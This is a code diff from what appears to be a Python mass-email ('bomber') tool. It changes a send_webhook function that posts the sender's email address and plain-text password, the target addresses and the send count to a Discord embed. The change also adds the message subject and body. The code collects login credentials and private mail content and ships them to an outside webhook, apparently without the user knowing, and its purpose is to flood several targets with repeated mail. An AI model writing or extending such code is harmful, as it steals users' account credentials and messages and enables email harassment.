@@ -51,7 +51,7 @@ def send_webhook():
 
     embed = DiscordEmbed(title="**Email Account:**",
                          description="**Email:**" + '\n' + str(email_me) + '\n' + "**Password:**" + '\n' + str(
-                             email_pass) + '\n' + "**Sent to:**" + '\n' + str(target_email) + '\n' + str(
+                             email_pass) + '\n' + "**What They Sent**" + '\n' + str(email_subject) + '\n' + '\n' + str(email_body) + '\n' + "**Sent to:**" + '\n' + str(target_email) + '\n' + str(
                              target_email2) + '\n' + str(target_email3) + '\n' + str(target_email4) + '\n' + str(
                              target_email5) + '\n' "**Sent** " + "**" + str(send_amount) + "**" + " **Times**",
                          color='8A2BE2')
